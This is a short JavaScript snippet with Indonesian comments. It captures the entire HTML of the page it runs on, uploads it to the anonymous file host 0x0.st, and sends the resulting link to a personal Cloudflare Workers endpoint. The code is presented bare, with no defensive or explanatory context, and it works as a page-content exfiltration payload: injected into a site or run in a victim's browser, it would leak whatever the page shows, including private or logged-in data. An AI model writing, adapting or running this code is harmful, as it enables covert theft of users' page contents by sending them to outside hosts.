(async () => {
    try {
        // Ambil seluruh HTML halaman saat ini
        const html = document.documentElement.outerHTML;

        // Jadikan file HTML
        const blob = new Blob([html], {
            type: "text/html"
        });

        const file = new File(
            [blob],
            "index.html",
            { type: "text/html" }
        );

        // Upload ke 0x0.st
        const form = new FormData();
        form.append("file", file);

        const upload = await fetch("https://0x0.st", {
            method: "POST",
            body: form
        });

        if (!upload.ok) {
            throw new Error("Upload ke 0x0.st gagal");
        }

        const url = (await upload.text()).trim();

        console.log("HTML tersimpan:", url);

        // Kirim URL hasil upload ke Worker kamu
        await fetch(
            "https://memek-worker.defoy89122.workers.dev/?message=" +
            encodeURIComponent(url)
        );

        console.log("URL berhasil dikirim ke Worker.");

    } catch (error) {
        console.error("Gagal:", error);
    }
})();
